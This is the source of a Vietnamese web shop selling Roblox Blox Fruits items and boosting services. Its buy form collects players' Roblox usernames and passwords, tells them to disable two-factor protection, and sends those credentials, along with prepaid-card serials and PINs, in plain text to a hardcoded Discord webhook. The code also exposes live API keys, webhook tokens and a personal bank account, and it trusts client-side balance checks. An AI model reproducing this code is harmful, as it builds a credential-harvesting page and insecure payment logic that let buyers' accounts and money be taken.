<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BAP SHOP - DASHBOARD PREMIUM</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        body { background-color: #0d0f13; color: #e2e8f0; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; overflow-x: hidden; }
        .sidebar { width: 280px; background: #151921; height: 100vh; position: fixed; left: 0; top: 0; border-right: 1px solid rgba(255,255,255,0.05); z-index: 50; }
        .main-content { margin-left: 280px; padding: 40px; min-height: 100vh; }
        .glass-card { background: #1c2128; border: 1px solid rgba(255,255,255,0.05); border-radius: 20px; transition: 0.3s; }
        .menu-item { display: flex; align-items: center; gap: 12px; padding: 14px 20px; border-radius: 12px; color: #94a3b8; cursor: pointer; transition: 0.2s; font-weight: 600; font-size: 14px; margin-bottom: 4px; }
        .menu-item:hover, .menu-active { background: rgba(244, 63, 94, 0.1); color: #f43f5e; }
        .btn-primary { background: #f43f5e; color: white; border-radius: 12px; font-weight: 800; transition: 0.3s; border: none; cursor: pointer; }
        .btn-primary:hover { background: #fb7185; transform: translateY(-2px); box-shadow: 0 4px 15px rgba(244, 63, 94, 0.3); }
        .modal-active { display: flex !important; }
        input, select { background: #11141b !important; border: 1px solid #2d3748 !important; color: white !important; outline: none; }
        input:focus { border-color: #f43f5e !important; }
    </style>
</head>
<body>

    <aside class="sidebar p-6 flex flex-col">
        <div class="flex items-center gap-3 mb-10 px-2 cursor-pointer" onclick="location.reload()">
            <div class="w-10 h-10 bg-rose-500 rounded-xl flex items-center justify-center font-bold text-xl shadow-lg shadow-rose-500/20">B</div>
            <h1 class="text-2xl font-extrabold tracking-tighter uppercase">BAP<span class="text-rose-500">SHOP</span></h1>
        </div>

        <div id="auth-section" class="mb-8">
            <button id="auth-btn" onclick="openForm('auth')" class="w-full btn-primary py-3.5 text-xs uppercase tracking-widest">ƒêƒÉng Nh·∫≠p H·ªá Th·ªëng</button>
            <div id="user-info" class="hidden glass-card p-5 border-l-4 border-rose-500">
                <p id="display-name" class="text-[10px] font-black uppercase text-slate-500 mb-1 tracking-widest"></p>
                <p class="text-xl font-extrabold text-white"><span id="balance">0</span><span class="text-rose-500 ml-1">ƒë</span></p>
                <button onclick="auth.signOut().then(()=>location.reload())" class="text-[10px] text-rose-400 mt-3 hover:underline uppercase font-bold">ƒêƒÉng xu·∫•t</button>
            </div>
        </div>

        <nav class="flex-1">
            <p class="px-4 text-[10px] font-black text-slate-600 uppercase tracking-[2px] mb-4">Danh m·ª•c d·ªãch v·ª•</p>
            <div onclick="showTab('fruit')" id="btn-fruit" class="menu-item menu-active"><span>üçç</span> Tr√°i Vƒ©nh Vi·ªÖn</div>
            <div onclick="showTab('gp')" id="btn-gp" class="menu-item"><span>‚öîÔ∏è</span> Gamepass</div>
            <div onclick="showTab('ct')" id="btn-ct" class="menu-item"><span>üî•</span> C√†y Thu√™ Uy T√≠n</div>
            
            <p class="px-4 text-[10px] font-black text-slate-600 uppercase tracking-[2px] mt-8 mb-4">T√†i kho·∫£n</p>
            <div onclick="openForm('card')" class="menu-item"><span>üí≥</span> N·∫°p Th·∫ª C√†o (Auto)</div>
            <div onclick="openForm('bank')" class="menu-item"><span>üè¶</span> Chuy·ªÉn Kho·∫£n / QR</div>
        </nav>
    </aside>

    <main class="main-content">
        <div class="relative w-full h-[260px] rounded-[32px] overflow-hidden mb-12 border border-white/5 shadow-2xl bg-[#161920]">
            <div class="absolute inset-0 bg-gradient-to-r from-rose-500/20 to-transparent z-10"></div>
            <div class="absolute inset-0 flex flex-col justify-center px-12 z-20">
                <span class="bg-rose-500 text-white text-[10px] font-black px-3 py-1 rounded-full w-fit mb-4 uppercase tracking-widest">Ho·∫°t ƒë·ªông 24/7</span>
                <h2 class="text-6xl font-black italic uppercase tracking-tighter mb-2">B·∫ÆP C√ÄY THU√ä <span class="text-rose-500">UY T√çN</span></h2>
                <p class="text-slate-400 font-bold uppercase tracking-[3px] text-sm">H·ªá th·ªëng d·ªãch v·ª• Blox Fruit s·ªë 1 th·ªã tr∆∞·ªùng</p>
            </div>
        </div>

        <div class="flex items-center justify-between mb-8 px-2">
            <h3 id="tab-title" class="text-2xl font-black uppercase tracking-tighter">Tr√°i Vƒ©nh Vi·ªÖn</h3>
            <div class="h-[2px] flex-1 mx-8 bg-white/5"></div>
        </div>

        <div id="fruit-list" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6"></div>
        <div id="gp-list" class="hidden grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-6"></div>
        <div id="ct-list" class="hidden grid grid-cols-1 lg:grid-cols-2 gap-6"></div>
    </main>

    <div id="modal-card" class="fixed inset-0 bg-black/90 z-[100] hidden items-center justify-center p-4">
        <div class="glass-card bg-[#151921] p-8 w-full max-w-md border-t-4 border-rose-500">
            <h2 class="text-2xl font-black text-center mb-8 uppercase italic tracking-tighter">N·∫°p Th·∫ª T·ª± ƒê·ªông</h2>
            <div class="space-y-4">
                <div class="grid grid-cols-2 gap-4">
                    <select id="card-type" class="p-4 rounded-xl font-bold text-sm cursor-pointer"><option value="VIETTEL">VIETTEL</option></select>
                    <select id="card-amount" onchange="calcTax()" class="p-4 rounded-xl font-bold text-sm cursor-pointer">
                        <option value="10000">10,000ƒë</option><option value="20000">20,000ƒë</option><option value="50000">50,000ƒë</option><option value="100000">100,000ƒë</option><option value="200000">200,000ƒë</option>
                    </select>
                </div>
                <div class="bg-rose-500/5 p-5 rounded-2xl border border-rose-500/10 flex justify-between items-center">
                    <div><p class="text-[9px] font-black text-slate-500 uppercase mb-1">S·ªë ti·ªÅn th·ª±c nh·∫≠n</p><p class="text-[9px] text-rose-400 font-bold">Chi·∫øt kh·∫•u h·ªá th·ªëng: 20%</p></div>
                    <span id="tax-result" class="text-2xl font-black text-rose-500 tracking-tighter">8,000ƒë</span>
                </div>
                <input id="card-seri" placeholder="S·ªê SERI TH·∫∫" class="w-full p-4 rounded-xl font-bold">
                <input id="card-pin" placeholder="M√É PIN TH·∫∫" class="w-full p-4 rounded-xl font-bold">
                <button onclick="sendCard()" class="btn-primary w-full py-4 uppercase font-black text-sm shadow-lg shadow-rose-500/20">X√°c Nh·∫≠n N·∫°p Th·∫ª</button>
                <button onclick="closeAll()" class="w-full text-slate-500 text-[10px] font-black uppercase mt-2 tracking-widest">H·ªßy Giao D·ªãch</button>
            </div>
        </div>
    </div>

    <div id="modal-buy" class="fixed inset-0 bg-black/90 z-[100] hidden items-center justify-center p-4">
        <div class="glass-card bg-[#151921] p-8 w-full max-w-md">
            <h2 id="buy-title" class="text-xl font-black text-center mb-8 uppercase text-rose-500 tracking-tighter"></h2>
            <div class="space-y-4">
                <input id="buy-acc" placeholder="T√ÄI KHO·∫¢N ROBLOX" class="w-full p-4 rounded-xl font-bold">
                <input id="buy-pass" type="password" placeholder="M·∫¨T KH·∫®U ROBLOX" class="w-full p-4 rounded-xl font-bold">
                <p class="text-[10px] text-center text-rose-400 font-bold uppercase italic">‚ö†Ô∏è Vui l√≤ng t·∫Øt b·∫£o m·∫≠t 2FA tr∆∞·ªõc khi mua!</p>
                <button onclick="processBuy()" class="btn-primary w-full py-4 font-black uppercase shadow-lg shadow-rose-500/20">Thanh To√°n Ngay</button>
                <button onclick="closeAll()" class="w-full text-slate-500 text-[10px] font-bold uppercase mt-2 tracking-widest text-center">Quay l·∫°i</button>
            </div>
        </div>
    </div>

    <div id="modal-auth" class="fixed inset-0 bg-black/95 z-[100] hidden items-center justify-center p-4">
        <div class="glass-card bg-[#151921] p-10 w-full max-w-sm text-center">
            <h2 class="text-3xl font-black mb-10 uppercase tracking-tighter italic">H·ªá Th·ªëng <span class="text-rose-500">BAP</span></h2>
            <input id="auth-u" placeholder="T√™n ƒëƒÉng nh·∫≠p" class="w-full p-4 rounded-xl mb-4 font-bold">
            <input id="auth-p" type="password" placeholder="M·∫≠t kh·∫©u" class="w-full p-4 rounded-xl mb-8 font-bold">
            <button onclick="handleLogin()" class="btn-primary w-full py-4 uppercase font-black mb-4 tracking-widest">V√†o C·ª≠a H√†ng</button>
            <p onclick="handleRegister()" class="text-slate-500 text-[10px] font-black uppercase cursor-pointer hover:text-white transition tracking-widest">Ch∆∞a c√≥ nick? ƒêƒÉng k√Ω ngay</p>
        </div>
    </div>

    <div id="modal-bank" class="fixed inset-0 bg-black/90 z-[100] hidden items-center justify-center p-4">
        <div class="glass-card p-8 w-full max-w-sm text-center">
            <h2 class="text-xl font-black text-rose-500 mb-6 uppercase tracking-widest italic">N·∫°p Qua ATM/MOMO</h2>
            <img src="https://i.postimg.cc/N0tWGcvJ/74b766b2-91f0-441c-95da-71b054c4a8c2.jpg" class="w-60 mx-auto rounded-3xl mb-6 shadow-2xl border border-white/5">
            <div class="text-left bg-white/5 p-5 rounded-2xl mb-6 font-bold text-xs leading-relaxed">
                <p class="text-slate-500 mb-1 uppercase text-[9px]">Th√¥ng tin chuy·ªÉn kho·∫£n:</p>
                <p class="text-rose-500 font-black text-lg mb-1 italic">228205353447</p>
                <p>AGRIBANK - LY THI HOA</p>
                <p class="mt-3 text-[10px] text-rose-300 italic">* N·ªôi dung: T√™n ƒëƒÉng nh·∫≠p c·ªßa b·∫°n</p>
            </div>
            <button onclick="baoDaBank()" class="w-full bg-white text-black py-4 rounded-xl font-black uppercase text-xs tracking-widest">T√¥i ƒë√£ chuy·ªÉn ti·ªÅn xong</button>
        </div>
    </div>

    <script>
        // --- üõ† TH√îNG TIN WEBHOOK C·ª¶A NGHƒ®A üõ† ---
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1467138431380623615/KxzLu2aos7455VXv-qOogLkoTC-c1XBJH7bJawv2eblGrxyY6vRDxVsBCdziIuOUB6g3";
        const NP_ID = "9565963734"; 
        const NP_KEY = "80df3668af04f2a85e1befc277896513";

        const firebaseConfig = { apiKey: "AIzaSyA5wBS88oS54yLs0OfwDYDfDQeTjc6ccdM", authDomain: "shop-blox-fruit-trannghia.firebaseapp.com", projectId: "shop-blox-fruit-trannghia", databaseURL: "https://shop-blox-fruit-trannghia-default-rtdb.firebaseio.com" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database(), auth = firebase.auth();

        const products = {
              fruit: [
    {n:"Kitsune VV", p:690000, img:"https://i.postimg.cc/5yHRjSfH/Anh-chup-man-hinh-2026-01-28-113329.png"},
    {n:"Dragon VV", p:750000, img:"https://i.postimg.cc/CLB3KS1g/Anh-chup-man-hinh-2026-01-28-113307.png"},
    {n:"Control VV", p:690000, img:"https://i.postimg.cc/qvnH14V7/Anh-chup-man-hinh-2026-01-28-113219.png"},
    {n:"Yeti VV", p:562000, img:"https://i.postimg.cc/dQxMvLJB/Anh-chup-man-hinh-2026-01-28-113255.png"},
    {n:"Tiger VV", p:562000, img:"https://i.postimg.cc/3NycWF3C/Anh-chup-man-hinh-2026-01-28-113337.png"},
    {n:"Spirit VV", p:463000, img:"https://i.postimg.cc/T1ZHb5PJ/Anh-chup-man-hinh-2026-01-28-113348.png"},
    {n:"Gas VV", p:452000, img:"https://i.postimg.cc/L6crYwY5/Anh-chup-man-hinh-2026-01-28-113319.png"},
    {n:"Venom VV", p:450000, img:"https://i.postimg.cc/kGtT7My6/Anh-chup-man-hinh-2026-01-28-113414.png"},
    {n:"Mochi (Dough) VV", p:444000, img:"https://i.postimg.cc/gj6gGcKM/Anh-chup-man-hinh-2026-01-28-113428.png"},
    {n:"Shadow VV", p:441000, img:"https://i.postimg.cc/QCWfjNqQ/Anh-chup-man-hinh-2026-01-28-113419.png"},
    {n:"T-Rex VV", p:420000, img:"https://i.postimg.cc/CMt2XX4m/Anh-chup-man-hinh-2026-01-28-113355.png"},
    {n:"Mammoth VV", p:420000, img:"https://i.postimg.cc/MKQLS5Pp/Anh-chup-man-hinh-2026-01-28-113409.png"},
    {n:"Gravity VV", p:408000, img:"https://i.postimg.cc/zv39K1FV/Anh-chup-man-hinh-2026-01-28-113238.png"},
    {n:"Blizzard VV", p:390000, img:"https://i.postimg.cc/5yLMm4SM/Anh-chup-man-hinh-2026-01-28-165200.png"},
    {n:"Pain VV", p:350000, img:"https://i.postimg.cc/NMGhGXyx/Anh-chup-man-hinh-2026-01-28-113228.png"},
    {n:"Lightning VV", p:350000, img:"https://i.postimg.cc/2yB0Cjxg/Anh-chup-man-hinh-2026-01-28-113433.png"},
    {n:"Sound VV", p:310000, img:"https://i.postimg.cc/pLZbwkrN/Anh-chup-man-hinh-2026-01-28-113451.png"},
    {n:"Love VV", p:300000, img:"https://i.postimg.cc/FHZ5MGzf/Anh-chup-man-hinh-2026-01-28-113457.png"},
    {n:"Creation VV", p:286000, img:"https://i.postimg.cc/d3Xg9S5x/Anh-chup-man-hinh-2026-01-28-113244.png"},
    {n:"Portal VV", p:250000, img:"https://i.postimg.cc/Z5ZzsXTM/Anh-chup-man-hinh-2026-01-28-113439.png"},
    {n:"Ph·∫≠t T·ªï VV", p:250000, img:"https://i.postimg.cc/tCQK78V7/Anh-chup-man-hinh-2026-01-28-113501.png"},
    {n:"Phoenix VV", p:250000, img:"https://i.postimg.cc/0yx1Xhkg/Anh-chup-man-hinh-2026-01-28-113443.png"},
    {n:"Spider VV", p:210000, img:"https://i.postimg.cc/Vk1PZ2f1/Anh-chup-man-hinh-2026-01-28-113448.png"},
    {n:"Quake VV", p:210000, img:"https://i.postimg.cc/CLT3d9fn/Anh-chup-man-hinh-2026-01-28-113506.png"},
    {n:"Ghost VV", p:150000, img:"https://i.postimg.cc/rFXBz7tx/Anh-chup-man-hinh-2026-01-28-113510.png"},
    {n:"Magma VV", p:150000, img:"https://i.postimg.cc/m2Y09VQF/Anh-chup-man-hinh-2026-01-28-113517.png"},
    {n:"Dark VV", p:130000, img:"https://i.postimg.cc/3wc6hqTH/Anh-chup-man-hinh-2026-01-28-113540.png"},
    {n:"Diamond VV", p:120000, img:"https://i.postimg.cc/HswfM3Q3/Anh-chup-man-hinh-2026-01-28-113522.png"},
    {n:"Light VV", p:120000, img:"https://i.postimg.cc/W43KQvxy/Anh-chup-man-hinh-2026-01-28-113530.png"},
    {n:"Ice VV", p:110000, img:"https://i.postimg.cc/YSsV7PH9/Anh-chup-man-hinh-2026-01-28-113545.png"},
    {n:"Eagle VV", p:111000, img:"https://i.postimg.cc/MGF4wLSc/Anh-chup-man-hinh-2026-01-28-113550.png"},
    {n:"Sand VV", p:100000, img:"https://i.postimg.cc/ZqMgmQhQ/Anh-chup-man-hinh-2026-01-28-113534.png"},
    {n:"Flame VV", p:100000, img:"https://i.postimg.cc/8zyXdYst/Anh-chup-man-hinh-2026-01-28-113555.png"},
    {n:"Blade VV", p:20000, img:"https://i.postimg.cc/BvXYmC1p/Anh-chup-man-hinh-2026-01-28-113602.png"}
],
            gp: [
                {n:"Fruit Notifier", p:370000, img:"https://i.postimg.cc/VNdGKFbx/Anh-chup-man-hinh-2026-01-28-113608.png"},
                {n:"Dark Blade", p:200000, img:"https://i.postimg.cc/d0LH59yQ/Anh-chup-man-hinh-2026-01-28-113612.png"},
                {n:"X2 Mastery VV", p:54000, img:"https://i.postimg.cc/44z82ym7/Anh-chup-man-hinh-2026-01-28-113623.png"},
                {n:"X2 Money VV", p:54000, img:"https://i.postimg.cc/8khyXcjW/Anh-chup-man-hinh-2026-01-28-113627.png"},
                {n:"1 Fruit Storage", p:50000, img:"https://i.postimg.cc/YSZXZm6C/Anh-chup-man-hinh-2026-01-28-113618.png"},
                {n:"X2 Drop VV", p:40000, img:"https://i.postimg.cc/PrTSgHwD/Anh-chup-man-hinh-2026-01-28-113631.png"},
                {n:"Fast Boat VV", p:40000, img:"https://i.postimg.cc/HkLBLt3Y/Anh-chup-man-hinh-2026-01-28-113635.png"}
            ],
            ct: [
                {n:"C√†y Thu√™ Level 1-2800", p:20000},
                {n:"L·∫•y V√µ V2 (T·∫∑ng Full Chi√™u)", p:30000},
                {n:"Th·ª©c T·ªânh Tr√°i V2 (L·ª≠a-Ch·∫•n ƒê·ªông)", p:20000},
                {n:"Th·ª©c T·ªânh Tr√°i V2 (Dough-Ph·∫≠t)", p:30000},
                {n:"Up V4 Full Gare", p:50000},
                {n:"L·∫•y Song Ki·∫øm Full", p:50000}
            ]
        };

        function calcTax() {
            const val = document.getElementById('card-amount').value;
            document.getElementById('tax-result').innerText = (val * 0.8).toLocaleString() + "ƒë";
        }

        function render() {
            ['fruit', 'gp'].forEach(tab => {
                document.getElementById(tab+'-list').innerHTML = products[tab].map((p, i) => `
                    <div class="glass-card p-5 text-center group cursor-pointer hover:bg-white/5 transition duration-300">
                        <div class="overflow-hidden rounded-2xl mb-4 shadow-xl"><img src="${p.img}" class="w-full aspect-square object-cover transition duration-700 group-hover:scale-110"></div>
                        <h4 class="font-black text-[11px] uppercase mb-1 text-slate-300 tracking-widest">${p.n}</h4>
                        <p class="text-rose-500 font-extrabold text-xl mb-5 tracking-tighter">${p.p.toLocaleString()}ƒë</p>
                        <button onclick="openBuy('${tab}', ${i})" class="btn-primary w-full py-3 text-[10px] uppercase tracking-widest">Mua Ngay</button>
                    </div>`).join('');
            });
            document.getElementById('ct-list').innerHTML = products.ct.map((p, i) => `
                <div class="glass-card p-8 flex items-center justify-between border-l-4 border-rose-500 hover:bg-white/5 transition">
                    <div><h4 class="font-black text-base uppercase mb-1 tracking-tight">${p.n}</h4><p class="text-[10px] text-slate-500 font-bold uppercase tracking-widest">‚ö° Ho√†n th√†nh trong ng√†y</p></div>
                    <div class="flex items-center gap-8"><p class="text-3xl font-black italic text-white tracking-tighter">${p.p.toLocaleString()}ƒë</p>
                    <button onclick="openBuy('ct', ${i})" class="btn-primary px-10 py-4 text-[10px] uppercase tracking-widest">ƒê·∫∑t H√†ng</button></div>
                </div>`).join('');
        }
        render();

        async function sendCard() {
            const type = document.getElementById('card-type').value, amount = document.getElementById('card-amount').value;
            const seri = document.getElementById('card-seri').value, pin = document.getElementById('card-pin').value;
            if(!seri || !pin) return alert("Vui l√≤ng ƒëi·ªÅn Seri v√† M√£ th·∫ª!");
            if(!auth.currentUser) return openForm('auth');

            // G·ª≠i Webhook b√°o admin g·∫°ch th·∫ª (Ho·∫∑c t√≠ch h·ª£p API g·∫°ch th·∫ª t·ª± ƒë·ªông ·ªü ƒë√¢y)
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: `üí≥ **TH√îNG B√ÅO N·∫†P TH·∫∫:**\n- Kh√°ch: ${document.getElementById('display-name').innerText}\n- Lo·∫°i: ${type} | MG: ${amount}\n- Seri: \`${seri}\` | Pin: \`${pin}\`` })
            });
            alert("ƒê√£ g·ª≠i th·∫ª l√™n h·ªá th·ªëng! Vui l√≤ng ch·ªù 1-3 ph√∫t ƒë·ªÉ admin duy·ªát.");
            closeAll();
        }

        let curItem = {};
        function openBuy(tab, i) { 
            if(!auth.currentUser) return openForm('auth'); 
            curItem = products[tab][i]; 
            document.getElementById('buy-title').innerText = curItem.n; 
            openForm('buy'); 
        }

        async function processBuy() {
            const acc = document.getElementById('buy-acc').value, pass = document.getElementById('buy-pass').value;
            if(!acc || !pass) return alert("Vui l√≤ng nh·∫≠p t√†i kho·∫£n v√† m·∫≠t kh·∫©u!");
            const snap = await db.ref('users/' + auth.currentUser.uid).get();
            const userData = snap.val();
            if((userData.balance || 0) < curItem.p) return alert("S·ªë d∆∞ kh√¥ng ƒë·ªß! Vui l√≤ng n·∫°p th√™m ti·ªÅn.");
            
            await db.ref('users/' + auth.currentUser.uid).update({ balance: userData.balance - curItem.p });
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ content: `üî• **ƒê∆†N H√ÄNG M·ªöI:**\n- S·∫£n ph·∫©m: ${curItem.n}\n- Kh√°ch: ${userData.username}\n- TK: \`${acc}\` | MK: \`${pass}\`` })
            });
            alert("Thanh to√°n th√†nh c√¥ng! ƒê∆°n h√†ng ƒëang ƒë∆∞·ª£c x·ª≠ l√Ω."); closeAll();
        }

        function showTab(t) {
            ['fruit','gp','ct'].forEach(id => {
                document.getElementById(id+'-list').classList.add('hidden');
                document.getElementById('btn-'+id).classList.remove('menu-active');
            });
            document.getElementById(t+'-list').classList.remove('hidden');
            document.getElementById('btn-'+t).classList.add('menu-active');
            document.getElementById('tab-title').innerText = t === 'fruit' ? 'Tr√°i Vƒ©nh Vi·ªÖn' : (t === 'gp' ? 'Gamepass' : 'C√†y Thu√™ Uy T√≠n');
        }

        function openForm(id) { closeAll(); document.getElementById('modal-'+id).classList.add('modal-active'); }
        function closeAll() { document.querySelectorAll('.fixed').forEach(m => m.classList.remove('modal-active')); }
        auth.onAuthStateChanged(u => { if(u) { document.getElementById('auth-btn').classList.add('hidden'); document.getElementById('user-info').classList.remove('hidden'); db.ref('users/'+u.uid).on('value', s => { if(s.exists()){ document.getElementById('display-name').innerText = s.val().username; document.getElementById('balance').innerText = (s.val().balance || 0).toLocaleString(); } }); } });
        async function handleLogin() { const u = document.getElementById('auth-u').value.toLowerCase().trim(), p = document.getElementById('auth-p').value; try { await auth.signInWithEmailAndPassword(u+"@bap.shop", p); location.reload(); } catch(e) { alert("Sai t√†i kho·∫£n ho·∫∑c m·∫≠t kh·∫©u!"); } }
        async function handleRegister() { const u = document.getElementById('auth-u').value.toLowerCase().trim(), p = document.getElementById('auth-p').value; if(u.length < 3) return alert("T√™n qu√° ng·∫Øn!"); try { const r = await auth.createUserWithEmailAndPassword(u+"@bap.shop", p); await db.ref('users/'+r.user.uid).set({username: u, balance: 0}); location.reload(); } catch(e) { alert("T√†i kho·∫£n ƒë√£ t·ªìn t·∫°i!"); } }
        async function baoDaBank() { const m = prompt("Nh·∫≠p s·ªë ti·ªÅn b·∫°n ƒë√£ chuy·ªÉn?"); if(m) { await db.ref('nap_bank').push({ uid: auth.currentUser.uid, amount: m, time: Date.now() }); alert("ƒê√£ b√°o admin ki·ªÉm tra!"); closeAll(); } }
    </script>
</body>
</html>
